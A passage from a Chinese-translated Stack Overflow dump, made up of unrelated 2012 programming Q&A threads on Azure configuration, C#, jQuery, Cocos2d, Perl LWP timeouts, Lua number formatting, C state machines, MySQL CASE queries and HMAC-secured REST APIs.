  WHILE @CurCard < @StartNum + @NumCards
  BEGIN
    INSERT INTO Cards (Cardnum, price, booktype, service)
    VALUES (@CurCard, @Price, @BookType, @Service)

    SELECT @CurCard = @CurCard + 1
  END
END

GO

EXEC sp_AddCards @Price=9.99, @BookType=1, @Service=12, @NumCards=250, @Startnum=810041;

SELECT * FROM Cards;

DROP TABLE Cards;
DROP PROCEDURE sp_AddCards; 
```

希望能帮助到你！

# visual-studio-2010 - Visual Studio 的 Windows Azure 工具 csdef 和 cscfg 不匹配

> ID：10989779
> 
> 赞同：6
> 
> 时间：2012-06-12T02:13:23.450
> 
> 标签：visual-studio-2010, azure, azure-configuration

我完全失去了理智，因为我有很多工作要做，而我现在什么也做不了。发生了一些事情，现在每次我尝试通过 Visual Studio 在 Windows Azure 模拟器中运行我们的项目时，它都会弹出问题标题中的错误。

“用于 Visual Studio .cscfg 和 .csdef 的 Windows Azure 工具不匹配”

我从来没有碰过这些文件，我还重新安装了 azure 工具（好几次！），以确保它们是完全默认的，而且它们是。老实说，我在这里完全不知所措，我不知道是什么原因造成的。谷歌搜索该错误绝对没有命中，这很奇怪。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2015-01-19T18:51:18.433

对我来说是空的

```
<ConfigurationSettings>
</ConfigurationSettings> 
```

块我必须插入到我的两个 cscfg 文件中。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-06-17T14:51:11.380

我有同样的问题。

为了解决这个问题，我将配置从 x86 更改为 AnyCPU。现在工作正常。

希望能帮助到你 ：）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-10T21:01:51.390

我也遇到过这个问题，并且对缺乏相关信息感到沮丧。但是，我发现简单的解决方案是从 azure 项目中删除角色并重新添加它。除非您要管理大量的配置设置，否则这是一个相当快速且轻松的过程。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-08-04T14:10:02.353

通过注释掉 csdef 中的负载平衡端点来解决我们的问题。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-01T01:56:25.687

在遇到与您完全相同的问题并出现完全相同的症状后，我发现手动启动 Compute Engine 模拟器是这样的：

> 系统托盘 > 右键单击​​ Windows Azure 模拟器 > 启动计算模拟器

神奇地让我再次运行我的 Azure 解决方案。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-12T08:40:37.693

请检查两个文件中的“serviceName”是否相同（即使您没有触摸任何内容）。这是两个文件中必须匹配的基本参数。

[http://msdn.microsoft.com/en-us/library/windowsazure/ee758710.aspx](http://msdn.microsoft.com/en-us/library/windowsazure/ee758710.aspx)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-12-03T14:55:09.793

就我而言，我可以在 Visual Studio 的解决方案资源管理器中看到两个构建配置（ .cscfg 文件）以及 .csdef 文件。但是 - 当我查看该文件夹中的实际文件时 - 有一个额外的 ServiceConfiguration.cscfg 文件需要更新。

注意：我添加了配置参数，但该 ServiceConfiguration.cscfg 文件中缺少这些参数。在我的输出窗口中，它显示了缺少哪些参数。

# c# - 方法：搜索类实例

> ID：10989780
> 
> 赞同：0
> 
> 时间：2012-06-12T02:13:23.740
> 
> 标签：c#, methods

我需要建议的是位于代码底部附近的“Equals”方法。需要注意的是，Equals 方法必须包含在 Order 类中，并且我不能使用自动实现的属性，以防你想知道我为什么不使用它们，哈哈。equals 方法的功能是搜索所有当前订单号（当前有 1 个用户和 3 个自动）以查找重复项。我无法弄清楚如何在没有用户输入或不使用一堆“if”语句的情况下做到这一点。任何建议都会很棒，谢谢。~~ 底部的另外两个方法还没写完~~

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Assignment3
{
  class Program
  {
    static void Main(string[] args)
    {
        // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~!
        // USER CONTROLLED
        int ordNum;
        Console.Write("Enter Order Number: ");
        ordNum = Convert.ToInt16(Console.ReadLine());

        string custName;
        Console.Write("Enter Customer Name: ");
        custName = Console.ReadLine();

        int quantity;
        Console.Write("Enter Quantity: ");
        quantity = Convert.ToInt32(Console.ReadLine());

        Order firstOrder = new Order(ordNum, custName, quantity);

        Console.WriteLine("Customer: {0}\nOrder Number: {1}\nQuantity" +
        "Ordered: {2}\nTotal Price: {3}", firstOrder.Customer, firstOrder.OrderNum, firstOrder.QuantityOrd, firstOrder.Total);
        // USER CONTROLLED

        // AUTOMATED
        // FIRST
        int firstOrdNum = 678123;
        string firstName ="P Jenkins";
        int firstQuantity = 35;
        Order firstAutomated = new Order(firstOrdNum, firstName, firstQuantity); // first Instance of Order
        // END OF FIRST

        // SECOND
        int secondOrdNum = 678123;
        string secondName = "L Jenkins";
        int secondQuantity = 35;
        Order secondAutomated = new Order(secondOrdNum, secondName, secondQuantity);
        // END OF SECOND

        // THIRD
        int thirdOrdNum = 49284;
        string thirdName = "McDonalds";
        int thirdQuantity = 78;
        Order thirdAutomated = new Order(thirdOrdNum, thirdName, thirdQuantity);
        // END OF THIRD
        // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    }
}
class Order
{
    private int orderNum;
    private string customer;
    private int quantityOrd;
    public const double amt = 19.95;
    private double totalPrice;
    // PROPERTIES TO ACCES PRIVATE DATA
    public int OrderNum // CHECK
    {
        get
        {
            return orderNum;
        }
        set
        {
            orderNum = value;
        }
    }
    public string Customer // CHECK
    {
        get
        {
            return customer;
        }
        set
        {
            customer = value;
        }
    }
    public int QuantityOrd // CHECK
    {
        get
        {
            return quantityOrd;
        }
        set
        {
            quantityOrd = value;
            CalcTotalPrice();
        }
    }
    public double Total // CHECK
    {
        get
        {
            return totalPrice;
        }
    }      
    // CALCULATE TOTAL
    private void CalcTotalPrice()
    {
        totalPrice = QuantityOrd * amt;
    }
    // EQUALS METHOD 
    public void Equals(int ordNum1, int ordNum2)
    {
        Console.WriteLine("The two orders by P Jenkens (Order Number: {0}) and L Jenkens (Order Number: {1})" +
            "are the same order!", ordNum1, ordNum2);
    }
    public void GetHashCode(string customer, double hashCode)
    {
        Console.WriteLine("The Hash Code of Customer {0} is {1}", customer, hashCode);
    }
    public void ToString()
    {
    }

    // CONSTRUCTOR TO ACCEPT VALUES
    public Order(int ordNum, string cust, int qntOrd)
    {
        OrderNum = ordNum;
        Customer = cust;
        QuantityOrd = qntOrd;
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T02:26:37.073

听起来每个人都`Order`应该有一个唯一的标识符。检查两个订单是否相同，将比较它们的 ID。检查两个订单是否具有相同的内部状态，就像普通的 Equals。

如果您想使用他们的 ID 访问订单，您应该将它们保存在字典中。

总体思路是这样的，尽管这里缺少很多内容：

```
public class Order
{
    ...

    private static Dictionary<int, Order> _orders = new Dictionary<int, Order>();

    public static Order Get(int id)
    {
        return this._order[id];
    }

    private static object _idLocker = new object();
    private static int _nextId = 0;
    public readonly int Id;

    public Order()
    {
        // Just to make sure that the identifiers are unique,
        // even if you have threads messing around.
        lock (_idLocker)
        {
            this.Id = _nextId;
            _nextId++;
        }

        _orders.Add(this.Id, this);
    }

    public Order(int id)
    {
        this.Id = id;
        _orders.Add(this.Id, this);
    }

    public static bool Equals(int id1, int id2)
    {
        return _orders[id1].Equals(_orders[id2]);
    }

    public bool Equals(Order otherOrder)
    {
        // Check whether you have the same inner state as the other order
    }
} 
```

# javascript - 如何检查 jQuery 中的 HTML 对象是否为空？

> ID：10989781
> 
> 赞同：3
> 
> 时间：2012-06-12T02:13:27.907
> 
> 标签：javascript, jquery, google-chrome-extension

我正在尝试使用 jQuery 在 HTML 中查找对象。

```
function getHats() {
    $.get('http://www.roblox.com/User.aspx?ID=1',
        function parse(data) {
            var id1 = $(data).find('#ctl00_cphRoblox_rbxUserAssetsPane_UserAssetsDataList_ctl09_AssetThumbnailHyperLink');
            hatname1 = id1.attr('title');
            hatlink1 = "http://www.roblox.com" + id1.attr('href');
            hatpic1 = id1.find('img').attr('src');
            var lim1 = id1.parent('.AssetThumbnail').find('div');
            if(!lim1) {
                hatlim1 = true;
                alert("Null")
            }else{
                hatlim1 = false;
            };
        }
    );
}; 
```

它总是弹出警报。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T02:16:35.387

使用长度 - 但您不必明确说明：

```
if (lim1.length) {
    // lim1 has a length! And it's not 0!
} else {
    // arg, lim1 has a length of 0
} 
```

等效地，否定运算符`!`将正常工作。

```
if (!lim1.length) {
    // arg!
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T02:14:54.857

在这种情况下，您可以使用`length`.

```
if(lim1.length < 1){
    //alert 
} 
```

# ios - CCLabelTTF 错误：发送到类的选择器无法识别

> ID：10989782
> 
> 赞同：2
> 
> 时间：2012-06-12T02:13:32.267
> 
> 标签：ios, crash, cocos2d-iphone

我在使用 Cocos2d 的 iOS 应用程序中遇到错误。这里是。

首先，我创建一个标签：

```
 CCLabelTTF *_alertaGC;

         ...
         ...

        _alertaGC = [CCLabelTTF labelWithString:@"" fontName:@"Marker Felt" fontSize:16];
        _alertaGC.color = ccc3(0, 0, 0);
        _alertaGC.position = [self convertiPad:ccp(110, 220)];
        _alertaGC.anchorPoint = CGPointMake(0.5f, 0.5f);

        [self addChild:_alertaGC z:100]; 
```

按下一个按钮，我更改了该标签的字符串：

```
...
_alertaGC.string = NSLocalizedString(@"LogFirst", @"Logueate primero");
... 
```

但是按下按钮时出现错误。自从我将 Cocos2d 从 0.99 更新到 2.0rc 之后就发生了这种情况……所以我认为有些事情发生了变化，或者出了点问题。这一定是愚蠢的，但我不明白......

**这是日志：**

```
2012-06-12 04:01:53.343 AwNoth[2286:707] *** Terminating app due to uncaught
 exception 'NSInvalidArgumentException', reason:
 '+[CCLabelTTF labelWithString:dimensions:fontName:fontSize:]: unrecognized selector
 sent to class 0xff6ec'
*** First throw call stack:
(0x330f388f 0x35098259 0x330f692f 0x330f5915 0x33050650 0xb020f 0xae2ff 0x330521fb 0x39129 0x36649 0x34271 0x3304d3fd 0x80923 0x80fd1 0x7f569 0x3561492b 0x35614319 0x355fa695 0x355f9f3b 0x3319722b 0x330c7523 0x330c74c5 0x330c6313 0x330494a5 0x3304936d 0x33196439 0x35628cd5 0xa7c4b 0x2ef8)
terminate called throwing an exception(lldb) 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T08:41:00.960

请注意，2.0rc 版本目前被认为是不稳定的。我没有这个版本，但我建议你简单地查看 CCLabelTTF 的源代码，看看类方法是如何声明的。

# perl - 有效处理 lwp 超时

> ID：10989783
> 
> 赞同：7
> 
> 时间：2012-06-12T02:13:39.107
> 
> 标签：perl, timeout, lwp, lwp-useragent

我正在使用 LWP 从网页下载内容，我想限制它等待页面的时间。这是在 lwp 中完成的，如下所示：

```
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
$ua->get($url); 
```

这很好用，除了超时达到其限制时，它就死了，我无法继续使用脚本！我真的很想正确处理这个超时，以便我可以记录 url 有一个超时，然后继续我的下一个。有谁知道如何做到这一点？谢谢！

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-06-12T03:14:00.250

[LWP::Agent](https://metacpan.org/module/LWP%3a%3aUserAgent)`get()`返回一个[HTTP::Response](https://metacpan.org/module/HTTP%3a%3aResponse)对象，可用于检查错误：

```
use LWP::Agent;
use HTTP::Status ();

my $ua = LWP::UserAgent->new;
$ua->timeout(10);
my $response = $ua->get($url);

if ($response->is_error) {
    printf "[%d] %s\n", $response->code, $response->message;

    # record the timeout
    if ($response->code == HTTP::Status::HTTP_REQUEST_TIMEOUT) {
        ...
    }
} 
```

顺便说一句，现在更好的做法是使用[Try::Tiny](https://metacpan.org/module/Try%3a%3aTiny)而不是`eval {...}`. 它给你`try {...} catch {...}`。它解决了一些检查问题`if $@`（请参阅文档中的背景部分`Try::Tiny`）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T03:53:48.310

对于大多数目的，LWP::UserAgent 的超时时间就足够了，但它确实存在一些缺点……它适用于*每个*系统调用，而不是它们的聚合。如果你真的需要一个固定的超时时间，这是[LWPx::ParanoidAgent](http://p3rl.org/LWPx%3a%3aParanoidAgent)需要注意的事情之一。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T02:37:18.580

您可以使用 eval 块在 Perl 中执行相当于 try{} catch {} 的操作：

[http://perldoc.perl.org/functions/eval.html](http://perldoc.perl.org/functions/eval.html)

# jquery - Phonegap Jquery Mobile 和 Xcode

> ID：10989784
> 
> 赞同：1
> 
> 时间：2012-06-12T02:13:57.443
> 
> 标签：jquery, ios, xcode, mobile

现在我正在用 jquery mobile 开发一个 iPhone 应用程序。我想知道我是否可以像普通的本机应用程序一样在 xcode 中制作不同的页面，并从我的 jquery 移动应用程序链接到该页面。所以基本上我的大多数应用程序页面都是用 jquery mobile 制作的，除了一个。是否可以像这样使用cordova 1.8在phonegap和objective c之间无缝转换？

我正在做的是制作一个食谱应用程序，我想在应用程序中制作一个厨房计时器页面。在这里，用户可以设置自己的厨房倒计时计时器，完成后会发出警报。我希望能够直接从食谱页面链接到厨房计时器。例如，如果食谱说煮 20 分钟，我将包含一个指向厨房计时器页面的链接，该页面将激活计时器 20 分钟。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:59:10.493

如果需要，您可以使用 PhoneGap 编写本机插件：http: [//docs.phonegap.com/en/2.0.0/guide_plugin-development_index.md.html#Plugin%20Development%20Guide](http://docs.phonegap.com/en/2.0.0/guide_plugin-development_index.md.html#Plugin%20Development%20Guide)这允许您从jQuery手机。您确定您的需求如此复杂吗？只需将另一个 .html 页面添加到您的 www/ 文件夹而不引用 jquery mobile，这可能是最简单的吗？

# ios - 类似十六进制的 NSString 到 int 值

> ID：10989786
> 
> 赞同：2
> 
> 时间：2012-06-12T02:14:16.307
> 
> 标签：ios, type-conversion

如何将其转换为 192 作为整数值？

```
NSString* hex = @"c0"; 
```

或者我有`char a1 = **'\xc0';`**如何将其转换为`int`？我不能在 Xcode 中使用 atoi。:(

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T02:20:55.013

你有两种选择，一种是 C 风格，一种是 Objective-C，第一种类似于

```
long value = 0;
sscanf_s([hex cStringUsingEncoding:NSUTF8StringEncoding], "%x", &value); 
```

后者类似于

```
long value = 0;
NSScanner *scanner = [NSScanner scannerWithString:hex];
[scanner scanHexInt:&value]; 
```

# jasper-reports - 线程“main”中的异常 java.lang.NoClassDefFoundError: org/hsqldb/Server

> ID：10989787
> 
> 赞同：1
> 
> 时间：2012-06-12T02:14:17.243
> 
> 标签：jasper-reports

我对贾斯珀报告完全陌生。

当我尝试遵循本[教程](http://jasperforge.org/website/ireportwebsite/IR%20Website/ir_design_a_report.html?header=project&target=ireport)时，我遇到了这个错误。

```
exception in thread "main" java.lang.NoClassDefFoundError: org/hsqldb/Server 
```

我将解压缩的文件夹放在下面`C:`并尝试从命令提示符运行它。

我正在运行`jdk 1.5`，刚刚开始学习 jasper 报告。

有什么设置要求吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:18:33.980

抱歉..我的错..我下载的 jar 文件与教程中提到的 jar 名称不同。:) 只需要更改 jar 名称。

# lua - 在 Lua 中格式化整数

> ID：10989788
> 
> 赞同：5
> 
> 时间：2012-06-12T02:14:24.823
> 
> 标签：lua, formatting, integer

我想将数字格式化为`1,234`or`1,234,432`或`123,456,789`，你明白了。我尝试这样做如下：

```
function reformatint(i)
    local length = string.len(i)
    for v = 1, math.floor(length/3) do
        for k = 1, 3 do
            newint = string.sub(mystring, -k*v)
        end
        newint = ','..newint
    end
    return newint
end 
```

如您所见，尝试失败，我的问题是我无法弄清楚错误是什么，因为我正在运行它的程序拒绝向我报告错误。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-12T08:20:47.517

这是一个考虑负数和小数部分的函数：

```
function format_int(number)

  local i, j, minus, int, fraction = tostring(number):find('([-]?)(%d+)([.]?%d*)')

  -- reverse the int-string and append a comma to all blocks of 3 digits
  int = int:reverse():gsub("(%d%d%d)", "%1,")

  -- reverse the int-string back remove an optional comma and put the 
  -- optional minus and fractional part back
  return minus .. int:reverse():gsub("^,", "") .. fraction
end

assert(format_int(1234)              == '1,234')
assert(format_int(1234567)           == '1,234,567')
assert(format_int(123456789)         == '123,456,789')
assert(format_int(123456789.1234)    == '123,456,789.1234')
assert(format_int(-123456789.)       == '-123,456,789')
assert(format_int(-123456789.1234)   == '-123,456,789.1234')
assert(format_int('-123456789.1234') == '-123,456,789.1234')

print('All tests passed!') 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-12T02:54:48.910

好吧，让我们从上到下。首先，它失败了，因为你有一个参考错误：

```
 ...
        for k = 1, 3 do
            newint = string.sub(mystring, -k*v) -- What is 'mystring'?
        end
    ... 
```

很可能你想`i`在那里，而不是`mystring`。

其次，虽然替换`mystring`为`i`可以修复错误，但它仍然无法正常工作。

```
> =reformatint(100)
,100
> =reformatint(1)
,000 
```

这显然是不对的。似乎您正在尝试做的是遍历字符串，并使用添加的逗号构建新字符串。但是有几个问题...

```
function reformatint(i)
    local length = string.len(i)
    for v = 1, math.floor(length/3) do
        for k = 1, 3 do -- What is this inner loop for?
            newint = string.sub(mystring, -k*v) -- This chops off the end of
                                                -- your string only
        end
        newint = ','..newint -- This will make your result have a ',' at
                             -- the beginning, no matter what
    end
    return newint
end 
```

通过一些返工，您可以获得一个有效的功能。

```
function reformatint(integer)
    for i = 1, math.floor((string.len(integer)-1) / 3) do
        integer = string.sub(integer, 1, -3*i-i) ..
                  ',' ..
                  string.sub(integer, -3*i-i+1)
    end
    return integer
end 
```

上面的功能似乎可以正常工作。然而，它相当复杂......可能想让它更具可读性。

作为旁注，[快速谷歌搜索](http://lua-users.org/wiki/FormattingNumbers)找到一个已经为此制作的功能：

```
function comma_value(amount)
  local formatted = amount
  while true do  
    formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
    if (k==0) then
      break
    end
  end
  return formatted
end 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T05:17:06.397

您可以不使用循环：

```
function numWithCommas(n)
  return tostring(math.floor(n)):reverse():gsub("(%d%d%d)","%1,")
                                :gsub(",(%-?)$","%1"):reverse()
end

assert(numWithCommas(100000) == "100,000")
assert(numWithCommas(100) == "100")
assert(numWithCommas(-100000) == "-100,000")
assert(numWithCommas(10000000) == "10,000,000")
assert(numWithCommas(10000000.00) == "10,000,000") 
```

需要第二个 gsub 以避免生成 -,100。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-12T21:38:36.290

[我记得在LÖVE 论坛上](https://love2d.org/forums)讨论过这个……让我去找找……

[找到了](https://love2d.org/forums/viewtopic.php?f=4&t=1802)！

这将适用于正整数：

```
function reformatInt(i)
  return tostring(i):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end 
```

在上面的链接中，您可以阅读有关实施的详细信息。

# c - C 代码 - 无法通过 putchar 插入新行。

> ID：10989789
> 
> 赞同：3
> 
> 时间：2012-06-12T02:14:43.497
> 
> 标签：c

我有一个 C 源代码。

```
#include <stdio.h>
#define IN_W 1
#define OUT_W 0
#define SPACE 32
#define TAB 9

int main() { 
    int c, state, temp;
    state = OUT_W;

    while ((c = getchar()) != EOF) {
        if ((c != SPACE || c != TAB) && (state == OUT_W)) {
            state = IN_W;
            temp = c;
            c = 13;
            putchar(c);
            c = 10;
            putchar(c);
            putchar(temp);          
        } else if (c != SPACE || c != TAB)
            putchar(c);     
        else 
            state = OUT_W;      
    }   
    return 0;
} 
```

我想要实现的是我将输入一些字符/单词并通过 getchar 捕获这些输入。当 getchar 收到除空格或制表符之外的任何字符时，它将打印一个新行，然后打印这些字符，直到找到空格或制表符（放弃它们）。例如，当我输入

```
123  eat    4bananas     in themorning 
```

该程序将打印

```
123
eat
4bananas
in
themorning 
```

我试图将它与 CR 或 LF 集成，但它仍然打印“123 eat 4bananas in themorning”。

我的问题是： 1\. 我错过了什么？2.在最后一个'else'中，哪个对正在运行的程序更有效：

```
 else 
        state = OUT_W; 
```

或者

```
 else if ((c == SPACE || c == TAB) && state == IN_W)
        state = OUT_W;
    else
        continue;        // or can I use single ';' since we do nothing in here? 
```

就这样。感谢您的帮助。

注意：我也尝试过使用 '\n' 和 '\t'。

问候，马里奥

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T02:21:04.013

这个表达式不是你想要的：`(c != SPACE || c != TAB)`

这总是正确的。If `c`is `SPACE`then it is not `TAB`，所以第二部分是真的。如果`c`是 TAB 则不是`SPACE`，所以第一部分是正确的。

在这两种情况下，您想要的是`(c != SPACE && c != TAB)` This is only true when `c`is not`SPACE`和 not `TAB`。运算符`&&`是布尔“和”。

另外，我建议不要使用像`13`你这样的幻数，而应该使用 C 字符常量，比如`'\r'`.

至于你的第二个问题，你的程序写得还不错。我绝对不认为你会通过添加 a 来改进它，`continue`我什至不太明白它会如何工作。（正如您所指出的，如果`else continue;`是在循环的最后，您可以省略`continue`; 实际上，您可以直接砍掉整个`else`，因为`else;`什么都不做。）

你写了一个小状态机。你有三个有趣的案例：

*   在状态 OUT_W 中，需要转换到状态 IN_W（这里是打印 CR/LF 以转到下一行的位置）
*   在状态 IN_W，找到另一个字符，停留在 IN_W（这里打印字符）
*   在状态 IN_W 中，找到了一个制表符或空格，因此需要转换到状态 OUT_W

还有第四种可能：

*   在 OUT_W 状态下，找到另一个选项卡或空格，留在 OUT_W 中（第三种情况处理得很好）

如果您想要最有效的代码，我认为最好重新排列它，以便您只需要在一个地方检查`SPACE`和：`TAB`

```
while ((c = getchar()) != EOF) {
    if (c == SPACE || c == TAB) {
        state = OUT_W;
    }
    else {
        /* c is not SPACE or TAB so we will print it */
        if (state == OUT_W) {
            /* transition from OUT_W to IN_W */
            state = IN_W;
            putchar('\r');
            putchar('\n');
            putchar(c);
        }
        else 
            putchar(c);
    }
} 
```

使用这个重构版本的代码，很明显，任何时候你在 IN_W 中都会打印字符，但只有在转换时才打印 CR/LF。因此，您可以将其缩短为没有`else`, always call `putchar(c);`，但在检查过渡后执行此操作。我会把它留给你作为练习。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T02:18:49.840

作为一个开始：

```
(c != SPACE || c != TAB) 
```

总是正确的。一个字符不能同时是空格和制表符，因此它必须*始终*是非制表符或非空格。我怀疑你的意思是：

```
(c != SPACE && c != TAB) 
```

这就是为什么状态*永远不会*回到的原因`OUT_W`，因为在第一行结束序列之后，第二个`if`语句总是正确的，所以它永远不会回到最后`else`一位。

以下代码可以正常工作：

```
#include <stdio.h>
#define IN_W 1
#define OUT_W 0
#define SPACE 32
#define TAB 9

int main (void) {
    int c, state, temp;
    state = OUT_W;

    while ((c = getchar()) != EOF) {
        if ((c != SPACE && c != TAB) && (state == OUT_W)) {
            state = IN_W;
            temp = c;
            c = 13;
            putchar(c);
            c = 10;
            putchar(c);
            putchar(temp);
        } else if (c != SPACE && c != TAB)
            putchar(c);
        else
            state = OUT_W;
    }
    return 0;
} 
```

尽管它仍然有那个烦人的初始换行符，您可以通过简单地将初始状态设置为`IN_W`.

您的代码中还有很多神奇的数字和一些相当不必要的值移动。可能更精致的版本是：

```
#include <stdio.h>

#define IN_W 1
#define OUT_W 0

#define SPACE ' '
#define TAB '\t'
#define CR '\r'
#define LF '\n'

int main (void) {
    int c, state;

    state = IN_W;
    while ((c = getchar()) != EOF) {
        if ((c != SPACE) && (c != TAB) && (state == OUT_W)) {
            putchar(CR);
            putchar(LF);
            putchar(c);
            state = IN_W;
        } else if ((c != SPACE) && (c != TAB))
            putchar(c);
        else
            state = OUT_W;
    }

    return 0;
} 
```

* * *

我要提到的一件事是，通常最好将状态机本身与执行的操作分开。为此，我会根据当前状态而不是字符/状态对做出主要选择，并将每个状态的动作与状态机分开。

我认为这使事情更具可读性，并且更容易修改：

```
#include <stdio.h>

enum tState { ST_WORD, ST_SPACE };

static enum tState doWord (int ch) {
    if ((ch == ' ') || (ch == '\t')) {
        putchar ('\r');
        putchar ('\n');
        return ST_SPACE;
    }
    putchar (ch);
    return ST_WORD;
}

static enum tState doSpace (int ch) {
    if ((ch == ' ') || (ch == '\t'))
        return ST_SPACE;
    putchar (ch);
    return ST_WORD;
}

int main (void) {
    int ch;
    enum tState state = ST_WORD;

    while ((ch = getchar()) != EOF) {
        switch (state) {
            case ST_WORD:  state = doWord  (ch); break;
            case ST_SPACE: state = doSpace (ch); break;
        }
    }

    return 0;
} 
```

# c# - 将数据附加到现有的 xml 文件而不将文件加载到内存中

> ID：10989795
> 
> 赞同：0
> 
> 时间：2012-06-12T02:14:58.177
> 
> 标签：c#, xml-serialization, xml-parsing, linq-to-xml

我想将数据添加到现有的 xml 文件中，而不必将现有文件加载到 momory 中。

我有一个数据模型：

```
public class clsPerson
{
    public string FirstName;
    public string LastName;
    public List<string> Likes;
} 
```

我有这段代码可以将两个人添加到 xml 文件中，关闭文件，然后我想再添加两个人......

```
 static void Main(string[] args)
    {
        List<clsPerson> p1 = new List<clsPerson>();
        p1.Add(new clsPerson { FirstName = "John", LastName = "Dow", Likes = new List<string> { "Apples", "Bananas" } });
        p1.Add(new clsPerson { FirstName = "Jane", LastName = "Dow", Likes = new List<string> { "Football", "Tennis" } });

        string file = @"D:\people.xml";

        System.Xml.Serialization.XmlSerializer x = new System.Xml.Serialization.XmlSerializer(p1.GetType());
        TextWriter tw = new StreamWriter(file);
        x.Serialize(tw, p1);

        tw.Close();           

        List<clsPerson> p2 = new List<clsPerson>();

        p2.Add(new clsPerson { FirstName = "New", LastName = "Guy", Likes = new List<string> { "Reading", "Walking" } });
        p2.Add(new clsPerson { FirstName = "Another", LastName = "Girl", Likes = new List<string> { "Surfing", "Running" } });

        //... i want to add p2 to people.xml without having to load the entire file into memory again
} 
```

我可以通过重新加载文件来添加两个新条目，将所有节点读入列表并添加新条目，但这似乎效率低下，特别是如果 xml 中有 1000 个条目。

# mysql - MySQL 查询中更复杂的 IF 语句

> ID：10989796
> 
> 赞同：0
> 
> 时间：2012-06-12T02:15:02.390
> 
> 标签：mysql, relational-database

一周前我问了一个相关问题，但这是我面临的另一个问题。我觉得自己像个菜鸟，但我想问和学习总比不学好。

这是我的三个表：

战斗机表

```
fighter_id, name 
```

事件表

```
event_id, event_name, event_date 
```

战斗表

```
fight_id, fighter_a, fighter_b, winner, method, event 
```

所以在fights 表中，fighter_a、fighter_b 和winner 是对应于Fighters 表中的fighter_id 的整数。

我基本上是在基于 fighter_id 检索数据的页面上。

我正在尝试为该战斗机的每次战斗创建行，其中包括他的对手的名字、结果（赢、输、平或 nc）、方法、event_name 和 event_date。如果是平局或无比赛，它会在方法栏中显示平局或无比赛，而获胜者将为空。

我正在查看这些 MySQL IF 语句，并创建了确定战斗机是否赢、输、平或没有比赛的适当标准。这些语句似乎不能在 PHP mysql_query 中使用，但至少它可以让您了解标准。我知道我必须将这 3 张桌子内部连接在一起，但我不确定如何确定赢家/输家/等等……因为 fighter_a 或 fighter_b 可以是赢家，或者两者都不是。我不知道如何在 MySQL 查询中处理这些 IF 语句。

```
IF winner IS NOT NULL AND winner=fighter_id THEN SET record='win';
ELSEIF winner IS NOT NULL AND winner<>fighter_id THEN SET record='loss';
ELSEIF winner IS NULL AND method='Draw' THEN SET record='draw';
ELSEIF winner IS NULL AND method='No Contest' THEN SET record='no contest';
ELSE SET record='';
ELSE IF; 
```

我试图在一个看起来像这样的表中得到一个结果： [http ://en.wikipedia.org/wiki/Fedor_Emelianenko#Mixed_martial_arts_record](http://en.wikipedia.org/wiki/Fedor_Emelianenko#Mixed_martial_arts_record)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:33:28.487

如果我对您的理解正确，我相信您会希望使用 CASE 语句来确定结果。战士需要加入，类似于：

```
select 
    fight_id,
    CASE
      WHEN winner is not null and winner=fighter_id then 'win'
      WHEN winner is not null and winner<>fighter_id then 'loss'
      WHEN winner is null and method='Draw' then 'draw'
      WHEN winner is null and method = 'No Contest' then 'no contest'
      ELSE ''
    END as match_result,
    participant.name 'participant',
    opponent.name 'opponent'
FROM fights
    INNER JOIN fighters as participant on participant.fighter_id = fights.fighter_a
    INNER JOIN fighters as oppoent on opponent.fighter_id = fights.fighter_b 
```

# .net - 使用 HMAC 保护 REST 服务

> ID：10989802
> 
> 赞同：1
> 
> 时间：2012-06-12T02:15:31.970
> 
> 标签：.net, security, rest

我一直在读这个：[http ://www.thebuzzmedia.com/designing-a-secure-rest-api-without-oauth-authentication/](http://www.thebuzzmedia.com/designing-a-secure-rest-api-without-oauth-authentication/)

这是一篇非常棒的文章。我想到的一个问题是这一步（在文章的后半部分）：

```
4\. (OPTIONAL) The only way to protect against “replay attacks” on your API is to include a timestamp of time kind along with the request so the server can decide if this is an “old” request, and deny it. The timestamp must be included into the HMAC generation (effectively stamping a created-on time on the hash) in addition to being checked “within acceptable bounds” on the server.
5\. [SERVER] Receive all the data from the client.
6\. [SERVER] (see OPTIONAL) Compare the current server’s timestamp to the timestamp the client sent. Make sure the difference between the two timestamps it within an acceptable time limit (5-15mins maybe) to hinder replay attacks. 
```

